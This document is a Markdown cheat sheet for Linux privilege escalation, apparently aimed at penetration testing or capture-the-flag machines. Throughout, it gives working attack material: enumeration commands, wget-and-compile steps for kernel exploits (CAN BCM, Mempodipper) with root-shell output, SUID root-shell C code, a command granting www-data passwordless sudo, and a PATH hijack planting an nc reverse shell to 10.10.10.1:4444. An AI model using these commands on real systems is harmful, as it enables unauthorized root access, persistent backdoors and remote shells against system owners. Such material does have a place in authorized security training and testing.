# Linux Privilege Esclation

- A thorough guide to Linux enumeration https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

- Check which users can login to this box, if they use their username as their password:
```bash
grep -vE "nologin|false" /etc/passwd
```
- checking the kernel version to find kernel exploits
```bash
uname -a
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
```
- Which applications have active connections
```bash
netstat -tulpn
```
- Services running as root
```bash
ps aux | grep root
```
- SUID/GUID variables
```bash
 find / -perm +2000 -user root -type f -print
 find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 ```

- **Handy Kernel Exploits**
  - CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
  ```bash
  wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
  $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
  $ ./i-can-haz-modharden
  [+] launching root shell!
  # id
  uid=0(root) gid=0(root)
   ```

  - CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 : </br>
  https://www.exploit-db.com/exploits/15285/

  - CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
  ```bash
  wget -O exploit.c http://www.exploit-db.com/download/18411
  gcc -o mempodipper exploit.c  
  ./mempodipper
  ```

  - CVE-2016-5195 - **Dirty Cow** - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 : </br>
  https://dirtycow.ninja/
  > First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016

- Run a command as a user other than root
```bash
sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
```

- Add or change a user's password
```bash
/usr/bin/useradd -p 'openssl passwd -1 thePassword' haxzor
echo thePassword | passwd haxzor --stdin
```

- **Local Privilege Escalation Exploits (Linux)**
  - SUID

    1. SUID C shell for /bin/bash
    ```
    int main(void) {
      setresuid(0, 0, 0);
      system("/bin/bash");
    }
    ```
    2. SUID C Shell for /bin/sh
    ```
    int main(void) {
      setresuid(0, 0, 0);
      system("/bin/sh");
    }
    ```
    3. Building the SUID Shell binary
    ```bash
    gcc -o suid suid.c
    ```
    For 32 bit:
    ```bash
    gcc -m32 -o suid suid.c
    ```
  - Creating and compiling without file transfer
  ```bash
  echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
  gcc privsc.c -o privsc
  ```

- Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead. In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.
```bash
set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
chmod +x ssh
```

- Searchsploit
```bash
searchsploit -uncsearchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local
searchsploit local
```

- Kernel exploit suggestion for Kernel Version 3.0
```bash
./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0
```

- Precompiled kernel exploits
https://www.kernel-exploits.com/

- Find and display the root.txt or flag.txt
```bash
cat `find / -name root.txt -print`
```
